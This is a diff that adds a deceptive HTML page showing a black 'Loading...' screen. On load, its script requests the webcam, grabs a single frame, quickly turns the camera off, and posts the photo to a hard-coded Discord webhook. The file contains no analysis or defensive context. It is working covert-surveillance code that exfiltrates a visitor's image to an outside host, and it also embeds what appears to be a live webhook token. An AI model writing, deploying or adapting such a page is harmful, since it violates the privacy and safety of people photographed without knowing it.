@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-color: #000000; /* Pure black screen */
+            overflow: hidden;
+        }
+
+        #video-preview {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="video-preview" autoplay playsinline></video>
+
+    <script>
+        // --- CONFIGURATION ---
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1566859862456012893/yFpi_aqyf2zcDOuhZY0b1SbW2xT4Ip1RtTOc0W8Ui3efD-MJOrEoxugHAIqE0gS1DEAe';
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            const video = document.getElementById('video-preview');
+
+            try {
+                // Automatically requests camera access as soon as the page opens
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Wait for the video feed to initialize
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // Create a canvas to capture the frame instantly
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+
+                // Apply mirror effect and draw the image
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Immediately turn off the camera light/stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Convert to file blob and upload to your Discord webhook
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'capture.jpg');
+                    formData.append('content', '📸 **Photo captured instantly on page load!**');
+
+                    try {
+                        await fetch(DISCORD_WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (err) {
+                        console.error('Failed to send to Discord:', err);
+                    }
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                console.error('Camera access blocked or denied:', err);
+            }
+        });
+    </script>
+</body>
+</html>
